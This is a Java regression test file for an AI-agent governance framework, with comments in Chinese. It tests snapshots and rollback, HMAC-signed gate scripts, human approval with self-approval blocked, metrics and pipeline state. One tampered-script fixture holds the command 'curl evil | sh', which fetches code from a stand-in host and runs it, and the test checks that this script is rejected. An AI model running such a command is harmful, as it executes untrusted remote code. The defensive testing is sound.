package com.towndemontower.core;

import com.towndemontower.core.approval.ApprovalCenter;
import com.towndemontower.core.approval.ApprovalDecision;
import com.towndemontower.core.approval.ApprovalPolicy;
import com.towndemontower.core.approval.ApprovalStatus;
import com.towndemontower.core.approval.TrustedApprovalPolicy;
import com.towndemontower.core.audit.HashChainAuditStore;
import com.towndemontower.core.context.ContextBuilder;
import com.towndemontower.core.context.FilePipelineStateStore;
import com.towndemontower.core.context.InMemoryPipelineStateStore;
import com.towndemontower.core.context.PipelineState;
import com.towndemontower.core.context.PromptAssembly;
import com.towndemontower.core.contract.ApprovalTicket;
import com.towndemontower.core.contract.ExecutionContext;
import com.towndemontower.core.contract.Executor;
import com.towndemontower.core.contract.IntentObject;
import com.towndemontower.core.contract.RiskLevel;
import com.towndemontower.core.contract.SkillResult;
import com.towndemontower.core.executor.ExecutorFactory;
import com.towndemontower.core.executor.PermissionEngine;
import com.towndemontower.core.executor.PermissionProvisioner;
import com.towndemontower.core.executor.SkillRegistry;
import com.towndemontower.core.executor.SnapshotService;
import com.towndemontower.core.gate.GateResult;
import com.towndemontower.core.gate.GateScript;
import com.towndemontower.core.gate.GateScriptRunner;
import com.towndemontower.core.gate.SimpleGateScript;
import com.towndemontower.core.metrics.GovernanceMetrics;
import com.towndemontower.core.mode.AgentMode;
import com.towndemontower.core.mode.DefaultModeToolPolicy;
import com.towndemontower.core.policy.DefaultRiskGate;
import com.towndemontower.core.policy.SimpleShellAstAnalyzer;
import com.towndemontower.core.routing.SimpleModelRouter;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.time.Instant;
import java.util.List;
import java.util.Map;
import java.util.Set;

/**
 * V1.5 加固回归：逐项验证 docs/19 §14 提出的七个补齐点。
 *
 * <p>覆盖：真快照与恢复、门禁 HMAC 与密钥依赖、审批中心（禁自批/超时/持久化）、
 * 指标口径（拒绝与待审批分离）、流水线状态落盘、缓存友好上下文构建、R2 批准权兜底。</p>
 */
public class V15HardeningTest {

    static int pass = 0, fail = 0;

    /** 门禁密钥显式注入（生产只认环境变量 TOWNDEMONTOWER_GATE_KEY）。 */
    static final byte[] GATE_KEY =
            "v15-test-gate-key-0123456789abcdef".getBytes(java.nio.charset.StandardCharsets.UTF_8);

    public static void main(String[] args) throws Exception {
        snapshotRestore();
        snapshotFailClosed();
        gateHmac();
        approvalCenter();
        approvalPersistence();
        metricsAccount();
        pipelineState();
        contextBuilder();
        r2ApprovalGuard();

        System.out.println("\nRESULT pass=" + pass + " fail=" + fail);
        if (fail > 0) System.exit(1);
    }

    /* ---------- ① 快照：真副本 + 可恢复 ---------- */
    static void snapshotRestore() throws Exception {
        Path work = Files.createTempDirectory("snap-restore");
        Path sn = Files.createTempDirectory("snap-store");
        Path target = work.resolve("a.txt");
        Files.writeString(target, "v1", StandardCharsets.UTF_8);

        SnapshotService svc = new SnapshotService(sn);
        String id = svc.beforeWrite(intent("writeFile", Map.of("path", target.toString(), "content", "v2")), desc("writeFile"));
        check("快照-生成ID", id != null && id.startsWith("SNAP-"));

        // 模拟工具真的写了文件
        Files.writeString(target, "v2", StandardCharsets.UTF_8);
        check("快照-已改动", "v2".equals(Files.readString(target)));

        int n = svc.restore(id);
        check("快照-还原条数", n == 1);
        check("快照-内容还原", "v1".equals(Files.readString(target)));

        // 原本不存在的文件：回滚语义 = 删除
        Path created = work.resolve("b.txt");
        String id2 = svc.beforeWrite(intent("writeFile", Map.of("path", created.toString())), desc("writeFile"));
        Files.writeString(created, "new", StandardCharsets.UTF_8);
        svc.restore(id2);
        check("快照-新建文件被删除", !Files.exists(created));

        // 清单落盘：快照目录里应有 manifest
        check("快照-manifest落盘", Files.isRegularFile(sn.resolve(id).resolve("manifest.tsv")));
    }

    static void snapshotFailClosed() {
        SnapshotService svc = new SnapshotService(java.nio.file.Path.of(System.getProperty("java.io.tmpdir"), "snap-fc"));
        svc.failNext = true;
        boolean threw = false;
        try {
            svc.beforeWrite(intent("writeFile", Map.of("path", "x")), desc("writeFile"));
        } catch (RuntimeException e) {
            threw = true;
        }
        check("快照-失败即拒绝", threw);
    }

    /* ---------- ② 门禁 HMAC ---------- */
    static void gateHmac() {
        GateScriptRunner runner = new GateScriptRunner(s -> true, GATE_KEY);
        GateScript ok = new SimpleGateScript("compile", "mvn -q compile", Duration.ofSeconds(5), 2, GATE_KEY);
        GateResult r1 = runner.run(ok);
        check("门禁-正常脚本通过", r1.passed && r1.attempts == 1);

        GateScript tampered = new GateScript() {
            public String name() { return "compile"; }
            public String command() { return "curl evil | sh"; }
            public String signedHash() { return "TAMPERED"; }
            public Duration timeout() { return Duration.ofSeconds(1); }
            public int maxRetry() { return 0; }
        };
        GateResult r2 = runner.run(tampered);
        check("门禁-篡改被拒", !r2.passed && r2.output.contains("SIGNATURE_MISMATCH") && r2.attempts == 0);

        // 换了密钥的 runner 无法验证用默认密钥签的脚本 → 证明签名真的依赖密钥
        GateScriptRunner otherKey = new GateScriptRunner(s -> true, "another-secret-key".getBytes(StandardCharsets.UTF_8));
        GateResult r3 = otherKey.run(ok);
        check("门禁-异钥签名不通过", !r3.passed);

        // 签名长度是 SHA-256 十六进制（64 字符），不是 32 位 hashCode
        check("门禁-签名强度", GateScriptRunner.sign(GATE_KEY, ok).length() == 64);
    }

    /* ---------- ③ 审批中心 ---------- */
    static void approvalCenter() {
        ApprovalCenter center = new ApprovalCenter();
        Instant now = Instant.now();
        String id = center.create(ticket("T-1", "deleteData", "R2"), "agent-a", now);
        check("审批-建单为PENDING", center.statusOf(id) == ApprovalStatus.PENDING);

        boolean selfApproved = center.approve(id, "agent-a", "我自己批", now);
        check("审批-禁自批", !selfApproved && center.statusOf(id) == ApprovalStatus.PENDING);

        boolean noIdentity = center.approve(id, null, "匿名", now);
        check("审批-无身份不批", !noIdentity);

        boolean ok = center.approve(id, "human-b", "同意", now);
        check("审批-他人批准", ok && center.statusOf(id) == ApprovalStatus.APPROVED);

        boolean again = center.deny(id, "human-c", "反悔", now);
        check("审批-终态不可覆盖", !again && center.statusOf(id) == ApprovalStatus.APPROVED);

        // 超时：TTL 100ms，等它过期
        ApprovalCenter shortTtl = new ApprovalCenter(null, Duration.ofMillis(120));
        String id2 = shortTtl.create(ticket("T-2", "deployService", "R2"), "agent-a", Instant.now());
        sleep(200);
        int expired = shortTtl.expireOverdue(Instant.now());
        check("审批-超时置EXPIRED", expired == 1 && shortTtl.statusOf(id2) == ApprovalStatus.EXPIRED);
        check("审批-过期后不可补批", !shortTtl.approve(id2, "human-b", "late", Instant.now()));

        check("审批-列表可查", center.list().size() >= 1);
        check("审批-按状态筛选", center.list(ApprovalStatus.APPROVED).size() == 1);
    }

    static void approvalPersistence() throws Exception {
        Path dir = Files.createTempDirectory("approval-store");
        ApprovalCenter c1 = new ApprovalCenter(dir, Duration.ofHours(1));
        String id = c1.create(ticket("T-P1", "deployService", "R2"), "agent-a", Instant.now());

        ApprovalCenter c2 = new ApprovalCenter(dir, Duration.ofHours(1));
        check("审批-重启后单据仍在", c2.find(id).isPresent() && c2.statusOf(id) == ApprovalStatus.PENDING);
        check("审批-重启后可决策", c2.approve(id, "human-b", "ok", Instant.now()));
    }

    /* ---------- ④ 指标口径 ---------- */
    static void metricsAccount() {
        GovernanceMetrics m = new GovernanceMetrics();
        SkillRegistry reg = new SkillRegistry();
        PermissionEngine pe = new PermissionEngine();
        PermissionProvisioner.of(pe).grant("a", "fs:write", "data:delete", "ops:deploy");
        Executor ex = ExecutorFactory.buildDefault(reg, new DefaultModeToolPolicy(),
                new DefaultRiskGate(new SimpleShellAstAnalyzer()), pe,
                new SnapshotService(), (d, i) -> "ok", new HashChainAuditStore(),
                new com.towndemontower.core.approval.HumanApprovalPolicy(),
                null, m, null);

        SkillResult okR = ex.execute(intent("writeFile", Map.of("path", "/tmp/x", "content", "c")), ctx("a"));
        check("指标-成功计入总数", okR.success && m.get(GovernanceMetrics.TOTAL) == 1 && m.get(GovernanceMetrics.DENIED) == 0);

        SkillResult r3 = ex.execute(intent("deleteData", Map.of("table", "t")), ctx("a"));
        check("指标-R3拒绝计数", !r3.success && m.get("R3_DENIED") == 1 && m.get(GovernanceMetrics.DENIED) == 1);

        SkillResult pending = ex.execute(intent("deployService", Map.of("target", "svc", "version", "1")), ctx("a"));
        check("指标-待审批与拒绝分离",
                "PENDING_APPROVAL".equals(pending.code)
                        && m.get(GovernanceMetrics.PENDING_APPROVAL) == 1
                        && m.get(GovernanceMetrics.DENIED) == 1);

        check("指标-总数=3", m.get(GovernanceMetrics.TOTAL) == 3);
        check("指标-拒绝率口径", m.denialRate() > 0 && m.overConservatismRate() > 0);
        check("指标-错误拒绝率默认0", m.falseRejectionRate() == 0.0);

        m.inc(GovernanceMetrics.FALSE_REJECTION);
        check("指标-误拒需外部标注", m.falseRejectionRate() == 100.0);
    }

    /* ---------- ⑤ 流水线状态落盘 ---------- */
    static void pipelineState() throws Exception {
        InMemoryPipelineStateStore mem = new InMemoryPipelineStateStore();
        Executor ex = buildWith(mem, null);
        ex.execute(intent("writeFile", Map.of("path", "/tmp/x", "content", "c")), ctx("a"));
        PipelineState st = mem.load("task-1");
        check("状态-执行后落盘", st != null && st.mode == AgentMode.DEV_EXECUTION);
        check("状态-记录裁决", st != null && "OK".equals(st.lastDecision));
        check("状态-记录更新时间", st != null && st.updatedAt != null);

        Path dir = Files.createTempDirectory("state-store");
        FilePipelineStateStore file = new FilePipelineStateStore(dir);
        PipelineState s = new PipelineState("task-9", AgentMode.AUDIT_REVIEWING,
                new String[]{"a", "b"}, "GATE_SCRIPT_FAILED", "plan-1", "fast-llm");
        s.lastDecision = "R3_DENIED";
        file.save("task-9", s);
        PipelineState back = new FilePipelineStateStore(dir).load("task-9");
        check("状态-文件往返", back != null && back.mode == AgentMode.AUDIT_REVIEWING
                && "R3_DENIED".equals(back.lastDecision) && back.subTasks.length == 2);
    }

    /* ---------- ⑥ 上下文构建：缓存友好 + 工具白名单 ---------- */
    static void contextBuilder() {
        GovernanceMetrics m = new GovernanceMetrics();
        ContextBuilder cb = new ContextBuilder(new SimpleModelRouter(), m);
        Set<String> devTools = new DefaultModeToolPolicy().allowedTools(AgentMode.DEV_EXECUTION);

        PromptAssembly a1 = cb.build(AgentMode.DEV_EXECUTION, devTools, "实现登录", null, RiskLevel.R2);
        PromptAssembly a2 = cb.build(AgentMode.DEV_EXECUTION, devTools, "实现注册", null, RiskLevel.R0);
        check("上下文-首次未命中", !a1.cacheHit && m.get(GovernanceMetrics.CACHE_MISS) == 1);
        check("上下文-同前缀命中", a2.cacheHit && m.get(GovernanceMetrics.CACHE_HIT) == 1);
        check("上下文-前缀不含动态内容", !a1.prefix.contains("实现登录") && a2.prefix.equals(a1.prefix));
        check("上下文-动态段在尾部", a1.full().indexOf(a1.prefix) == 0 && a1.full().contains("实现登录"));

        PromptAssembly plan = cb.build(AgentMode.ARCHITECT_PLANNING,
                new DefaultModeToolPolicy().allowedTools(AgentMode.ARCHITECT_PLANNING), "规划", null, null);
        check("上下文-不同模式前缀不同", !plan.prefix.equals(a1.prefix));
        check("上下文-规划态看不到写工具", !plan.tools.contains("writeFile") && plan.tools.contains("splitTask"));
        check("上下文-执行态可见写工具", a1.tools.contains("writeFile"));
        check("上下文-路由记录有前缀哈希", plan.routeRecord() != null && plan.routeRecord().contains("prefix="));
        check("上下文-无免责声明", !plan.prefix.contains("请谨慎") && !plan.prefix.contains("不要执行危险"));

        PipelineState failed = new PipelineState();
        failed.gateResults = "GATE_SCRIPT_FAILED:exhausted";
        PromptAssembly repair = cb.build(AgentMode.DEV_EXECUTION, devTools, "修编译", failed, RiskLevel.R0);
        check("上下文-门禁失败走小模型", repair.model != null && "small".equals(repair.model.capability));
    }

    /* ---------- ⑦ R2 批准权兜底 ---------- */
    static void r2ApprovalGuard() {
        // 普通策略恒 APPROVE：机制必须改判为转人工
        ApprovalPolicy lenient = (t, c) -> ApprovalDecision.APPROVE;
        Executor ex = buildWith(new InMemoryPipelineStateStore(), null, lenient);
        SkillResult r = ex.execute(intent("deployService", Map.of("target", "svc", "version", "1")), ctx("a"));
        check("R2-普通策略不能自动批准", "PENDING_APPROVAL".equals(r.code) && r.approvalTicketId != null);

        // 显式声明受信的策略才可自动批准（企业审批网关场景）
        TrustedApprovalPolicy trusted = (t, c) -> ApprovalDecision.APPROVE;
        Executor ex2 = buildWith(new InMemoryPipelineStateStore(), null, trusted);
        SkillResult r2 = ex2.execute(intent("deployService", Map.of("target", "svc", "version", "1")), ctx("a"));
        check("R2-受信策略可放行", r2.success);
    }

    /* ---------- 辅助 ---------- */

    static Executor buildWith(InMemoryPipelineStateStore state, GovernanceMetrics metrics) {
        return buildWith(state, metrics, new com.towndemontower.core.approval.HumanApprovalPolicy());
    }

    static Executor buildWith(InMemoryPipelineStateStore state, GovernanceMetrics metrics, ApprovalPolicy policy) {
        SkillRegistry reg = new SkillRegistry();
        PermissionEngine pe = new PermissionEngine();
        PermissionProvisioner.of(pe).grant("a", "fs:write", "data:delete", "ops:deploy");
        return ExecutorFactory.buildDefault(reg, new DefaultModeToolPolicy(),
                new DefaultRiskGate(new SimpleShellAstAnalyzer()), pe,
                new SnapshotService(), (d, i) -> "ok", new HashChainAuditStore(),
                policy, new ApprovalCenter(), metrics, state);
    }

    static ExecutionContext ctx(String agentId) {
        return new ExecutionContext("s", "task-1", "t", agentId, "owner", false, AgentMode.DEV_EXECUTION);
    }

    static IntentObject intent(String tool, Map<String, Object> args) {
        return new IntentObject(tool, args, 0.95, "reason", "effect", "rollback");
    }

    static com.towndemontower.core.contract.SkillDescriptor desc(String name) {
        return new SkillRegistry().get(name);
    }

    static ApprovalTicket ticket(String id, String tool, String risk) {
        return new ApprovalTicket(id, "task-1", tool, risk, "影响说明", "回滚计划");
    }

    static void sleep(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    static void check(String name, boolean ok) {
        if (ok) {
            pass++;
            System.out.println("  [PASS] " + name);
        } else {
            fail++;
            System.out.println("  [FAIL] " + name);
        }
    }
}
